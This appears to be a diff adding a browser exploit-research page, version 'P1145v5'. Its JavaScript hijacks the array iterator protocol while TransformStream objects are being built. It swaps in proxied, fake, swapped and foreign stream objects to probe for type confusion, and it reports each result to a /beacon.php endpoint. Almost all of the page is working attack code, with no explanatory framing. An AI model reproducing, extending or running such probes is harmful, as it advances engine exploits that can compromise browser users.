@@ -1,0 +1,373 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1145v5</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+log('phase','=== P1145v5: FULL PROXY ALL SLOTS + PASS-1 ATTACK ===');
+log('info','v4 showed: slot0 proxy caught 0 accesses. Engine ignores slot0.');
+log('info','NEW: proxy RS/WS in pass2, and substitute on PASS 1!');
+B('P1145V5-START','t='+Date.now());
+
+var origIter=Array.prototype[Symbol.iterator];
+
+// ===== SECTION A: Proxy RS (slot1) and WS (slot2) in pass 2 =====
+log('phase','--- A: Proxy RS+WS in pass 2 ---');
+var p2Calls=[];
+var passA=0;
+
+function makeProxyLog(tag,target){
+  return new Proxy(target,{
+    get:function(t,p,r){
+      p2Calls.push({tag:tag,op:'get',prop:String(p)});
+      return Reflect.get(t,p,r);
+    },
+    set:function(t,p,v,r){
+      p2Calls.push({tag:tag,op:'set',prop:String(p),val:String(v).substring(0,20)});
+      log('win','P2-'+tag+'.set: '+p+' = '+String(v).substring(0,20));
+      return Reflect.set(t,p,v,r);
+    }
+  });
+}
+
+Array.prototype[Symbol.iterator]=function(){
+  passA++;
+  if(passA===2 && this.length===3){
+    // Proxy ALL three slots
+    var p0=makeProxyLog('S0',this[0]);
+    var p1=makeProxyLog('RS',this[1]);
+    var p2=makeProxyLog('WS',this[2]);
+    return [p0, p1, p2][Symbol.iterator]();
+  }
+  return origIter.call(this);
+};
+
+var tsA=null;
+var aResult='?';
+try{
+  passA=0;
+  p2Calls=[];
+  tsA=new TransformStream({transform:function(c,ctrl){ctrl.enqueue(c+'_A');}});
+  aResult='OK';
+}catch(e){
+  aResult='ERR:'+e.message.substring(0,60);
+}
+Array.prototype[Symbol.iterator]=origIter;
+
+log(aResult==='OK'?'ok':'fail','Pass2 full proxy: '+aResult);
+log('info','Construction proxy calls: '+p2Calls.length);
+var conGets={};
+for(var i=0;i<p2Calls.length;i++){
+  var k=p2Calls[i].tag+'.'+p2Calls[i].prop;
+  conGets[k]=(conGets[k]||0)+1;
+}
+var conStr=[];for(var k in conGets) conStr.push(k+'('+conGets[k]+')');
+log('info','  Accessed: '+conStr.join(', '));
+B('P1145V5-A-CONSTRUCT',aResult+'|calls='+p2Calls.length+'|access='+conStr.join(','));
+
+// Write through and check
+if(tsA){
+  var preWrite=p2Calls.length;
+  try{
+    var wA=tsA.writable.getWriter();
+    wA.write('DATA_A');wA.close();
+    var rA=tsA.readable.getReader();
+    rA.read().then(function(res){
+      var postWrite=p2Calls.length;
+      var newCalls=postWrite-preWrite;
+      log('ok','Read: '+(res.done?'done':res.value));
+      log('info','Write-phase proxy calls: '+newCalls);
+      var writeGets={};
+      for(var i=preWrite;i<p2Calls.length;i++){
+        var k=p2Calls[i].tag+'.'+p2Calls[i].prop;
+        writeGets[k]=(writeGets[k]||0)+1;
+      }
+      var wStr=[];for(var k in writeGets) wStr.push(k+'('+writeGets[k]+')');
+      log('info','  Write accessed: '+wStr.join(', '));
+      B('P1145V5-A-WRITE','newCalls='+newCalls+'|access='+wStr.join(',')+'|val='+(res.done?'done':res.value));
+      doSectionB();
+    },function(e){log('fail','Err: '+e);B('P1145V5-A-ERR',String(e));doSectionB();});
+  }catch(e){log('fail','Write: '+e.message);doSectionB();}
+}else{doSectionB();}
+
+function doSectionB(){
+  // ===== SECTION B: PASS 1 SUBSTITUTION =====
+  log('phase','--- B: Pass-1 substitution (the JS-visible streams) ---');
+
+  // Pass 1 has [RS, WS] (len=2). These become ts.readable and ts.writable
+  // If we substitute here, the JS-visible API changes!
+  var passB=0;
+  var capturedPass1=null;
+  var fakeRS=new ReadableStream({
+    start:function(ctrl){
+      log('win','FAKE RS start!');
+      ctrl.enqueue('FAKE_CHUNK_1');
+      ctrl.enqueue('FAKE_CHUNK_2');
+      ctrl.close();
+    }
+  });
+
+  Array.prototype[Symbol.iterator]=function(){
+    passB++;
+    if(passB===1 && this.length===2){
+      capturedPass1=[this[0],this[1]];
+      // Substitute RS with our fake, keep WS
+      log('win','PASS 1 SUBSTITUTION!');
+      return [fakeRS, this[1]][Symbol.iterator]();
+    }
+    return origIter.call(this);
+  };
+
+  var bResult='?';
+  var tsB=null;
+  try{
+    passB=0;
+    tsB=new TransformStream();
+    bResult='OK';
+    log('ok','Pass-1 substitution accepted!');
+
+    // Check what ts.readable is
+    var isOurFake=(tsB.readable===fakeRS);
+    log('info','ts.readable === fakeRS: '+isOurFake);
+    B('P1145V5-B-PASS1','ok=true|isFake='+isOurFake);
+
+    // Read from the "confused" stream
+    try{
+      var rB=tsB.readable.getReader();
+      rB.read().then(function(res){
+        log('ok','Pass1-sub read: '+(res.done?'done':res.value));
+        B('P1145V5-B-READ1',res.done?'done':'val='+res.value);
+        rB.read().then(function(res2){
+          log('ok','Pass1-sub read2: '+(res2.done?'done':res2.value));
+          B('P1145V5-B-READ2',res2.done?'done':'val='+res2.value);
+          doSectionB2();
+        });
+      });
+    }catch(e){log('fail','Read: '+e.message);doSectionB2();}
+  }catch(e){
+    bResult='ERR:'+e.message.substring(0,60);
+    log('fail','Pass-1 sub: '+bResult);
+    B('P1145V5-B-PASS1','err='+bResult);
+    doSectionB2();
+  }
+  Array.prototype[Symbol.iterator]=origIter;
+}
+
+function doSectionB2(){
+  // ===== B2: Pass-1 SWAP RS and WS =====
+  log('phase','--- B2: Pass-1 swap RS<->WS ---');
+  var passB2=0;
+
+  Array.prototype[Symbol.iterator]=function(){
+    passB2++;
+    if(passB2===1 && this.length===2){
+      // Swap positions!
+      return [this[1], this[0]][Symbol.iterator]();
+    }
+    return origIter.call(this);
+  };
+
+  var b2Result='?';
+  try{
+    passB2=0;
+    var tsB2=new TransformStream();
+    b2Result='OK';
+    log('ok','Pass-1 swap accepted');
+
+    // Check types
+    var rIsRS=(tsB2.readable instanceof ReadableStream);
+    var rIsWS=(tsB2.readable instanceof WritableStream);
+    var wIsRS=(tsB2.writable instanceof ReadableStream);
+    var wIsWS=(tsB2.writable instanceof WritableStream);
+    log('info','readable: RS='+rIsRS+' WS='+rIsWS);
+    log('info','writable: RS='+wIsRS+' WS='+wIsWS);
+    B('P1145V5-B2-SWAP','ok=true|r_RS='+rIsRS+'|r_WS='+rIsWS+'|w_RS='+wIsRS+'|w_WS='+wIsWS);
+
+    if(rIsWS || wIsRS){
+      log('win','!!! TYPE CONFUSION: readable IS WritableStream or writable IS ReadableStream !!!');
+      B('P1145V5-B2-CONFUSION','YES');
+    }
+  }catch(e){
+    b2Result='ERR:'+e.message.substring(0,60);
+    log('fail','Swap: '+b2Result);
+    B('P1145V5-B2-SWAP','err='+b2Result);
+  }
+  Array.prototype[Symbol.iterator]=origIter;
+
+  doSectionC();
+}
+
+function doSectionC(){
+  // ===== SECTION C: Pass-1 replace RS with ArrayBuffer =====
+  log('phase','--- C: Pass-1 replace RS with non-stream object ---');
+  var passC=0;
+
+  var replacements=[
+    {name:'obj',val:{}},
+    {name:'AB',val:new ArrayBuffer(256)},
+    {name:'fakeRS',val:{getReader:function(){return {read:function(){return Promise.resolve({value:'HIJACKED',done:false});},releaseLock:function(){}};},locked:false,cancel:function(){},pipeTo:function(){},pipeThrough:function(){},tee:function(){}}},
+  ];
+
+  for(var ci=0;ci<replacements.length;ci++){
+    var rep=replacements[ci];
+    passC=0;
+
+    Array.prototype[Symbol.iterator]=function(){
+      passC++;
+      if(passC===1 && this.length===2){
+        return [rep.val, this[1]][Symbol.iterator]();
+      }
+      return origIter.call(this);
+    };
+
+    var cResult='?';
+    try{
+      passC=0;
+      var tsC=new TransformStream();
+      cResult='OK';
+
+      // Check readable
+      var rType=typeof tsC.readable;
+      var rIsRS=false;
+      try{rIsRS=(tsC.readable instanceof ReadableStream);}catch(e){}
+      log('ok','RS='+rep.name+': OK, readable type='+rType+' isRS='+rIsRS);
+
+      // If it's our fake, try reading
+      if(rep.name==='fakeRS' && !rIsRS){
+        try{
+          var rdr=tsC.readable.getReader();
+          rdr.read().then(function(res){
+            log('win','!!! FAKE RS READ: '+JSON.stringify(res)+' !!!');
+            B('P1145V5-C-FAKEREAD',JSON.stringify(res));
+          });
+        }catch(e){log('fail','Fake read: '+e.message);}
+      }
+    }catch(e){
+      cResult='ERR:'+e.message.substring(0,40);
+      log('fail','RS='+rep.name+': '+cResult);
+    }
+    B('P1145V5-C-'+rep.name,cResult);
+    Array.prototype[Symbol.iterator]=origIter;
+  }
+
+  doSectionD();
+}
+
+function doSectionD(){
+  // ===== SECTION D: Error path testing =====
+  log('phase','--- D: Error/abort paths with substitution ---');
+  var passD=0;
+  var errorProxyCalls=[];
+
+  Array.prototype[Symbol.iterator]=function(){
+    passD++;
+    if(passD===2 && this.length===3){
+      // Proxy all 3 for error path monitoring
+      var p0=new Proxy(this[0],{get:function(t,p){errorProxyCalls.push('S0.'+p);return Reflect.get(t,p);},set:function(t,p,v){errorProxyCalls.push('S0.SET.'+p);return Reflect.set(t,p,v);}});
+      var p1=new Proxy(this[1],{get:function(t,p){errorProxyCalls.push('RS.'+p);return Reflect.get(t,p);},set:function(t,p,v){errorProxyCalls.push('RS.SET.'+p);return Reflect.set(t,p,v);}});
+      var p2=new Proxy(this[2],{get:function(t,p){errorProxyCalls.push('WS.'+p);return Reflect.get(t,p);},set:function(t,p,v){errorProxyCalls.push('WS.SET.'+p);return Reflect.set(t,p,v);}});
+      return [p0,p1,p2][Symbol.iterator]();
+    }
+    return origIter.call(this);
+  };
+
+  try{
+    passD=0;
+    errorProxyCalls=[];
+    var tsD=new TransformStream({
+      transform:function(chunk,ctrl){
+        throw new Error('DELIBERATE_ERROR');
+      }
+    });
+    Array.prototype[Symbol.iterator]=origIter;
+
+    var preErr=errorProxyCalls.length;
+    var wD=tsD.writable.getWriter();
+    wD.write('TRIGGER_ERROR').catch(function(e){
+      var postErr=errorProxyCalls.length;
+      var newCalls=postErr-preErr;
+      log('info','Error path proxy calls: '+newCalls);
+      var unique={};
+      for(var i=preErr;i<errorProxyCalls.length;i++) unique[errorProxyCalls[i]]=1;
+      var uStr=Object.keys(unique).join(',');
+      log('info','Error accessed: '+uStr);
+      B('P1145V5-D-ERROR','newCalls='+newCalls+'|access='+uStr);
+      if(newCalls>0){
+        log('win','!!! PROXY ACCESSED DURING ERROR PATH !!!');
+      }
+      doFinal();
+    });
+    wD.abort('TEST_ABORT').catch(function(){});
+  }catch(e){
+    Array.prototype[Symbol.iterator]=origIter;
+    log('fail','Error test: '+e.message);
+    doFinal();
+  }
+}
+
+function doFinal(){
+  // ===== SECTION E: Cross-wire via pass-1 capture =====
+  log('phase','--- E: Cross-wire two TS via pass-1 ---');
+  var pass1_1=null;
+  var passE=0;
+
+  // Create TS1, capture pass-1 streams
+  Array.prototype[Symbol.iterator]=function(){
+    passE++;
+    if(passE===1 && this.length===2) pass1_1=[this[0],this[1]];
+    return origIter.call(this);
+  };
+  var tsE1=null;
+  try{passE=0;tsE1=new TransformStream();}catch(e){}
+  Array.prototype[Symbol.iterator]=origIter;
+
+  if(pass1_1){
+    // Create TS2, substitute TS1's pass-1 streams
+    passE=0;
+    Array.prototype[Symbol.iterator]=function(){
+      passE++;
+      if(passE===1 && this.length===2){
+        return pass1_1[Symbol.iterator]();
+      }
+      return origIter.call(this);
+    };
+    var tsE2=null;
+    try{
+      passE=0;
+      tsE2=new TransformStream();
+      log('ok','TS2 created with TS1 pass-1 streams');
+
+      var e2same_r=(tsE2.readable===tsE1.readable);
+      var e2same_w=(tsE2.writable===tsE1.writable);
+      log('info','TS2.readable===TS1.readable: '+e2same_r);
+      log('info','TS2.writable===TS1.writable: '+e2same_w);
+      B('P1145V5-E-CROSS','same_r='+e2same_r+'|same_w='+e2same_w);
+
+      if(e2same_r||e2same_w){
+        log('win','!!! STREAMS SHARED BETWEEN TWO TS !!!');
+        // Write to TS1, read from TS2
+        try{
+          var wE=tsE1.writable.getWriter();
+          wE.write('CROSS_TEST');wE.close();
+          var rE=tsE2.readable.getReader();
+          rE.read().then(function(res){
+            log('win','Cross read: '+(res.done?'done':res.value));
+            B('P1145V5-E-CROSSREAD',res.done?'done':'val='+res.value);
+          });
+        }catch(e3){log('fail','Cross: '+e3.message);}
+      }
+    }catch(e){
+      log('fail','TS2 cross: '+e.message);
+      B('P1145V5-E-CROSS-ERR',e.message.substring(0,60));
+    }
+    Array.prototype[Symbol.iterator]=origIter;
+  }
+
+  setTimeout(function(){
+    B('P1145V5-DONE','complete');
+    log('phase','=== P1145v5 COMPLETE ===');
+  },500);
+}
+</script></body></html>
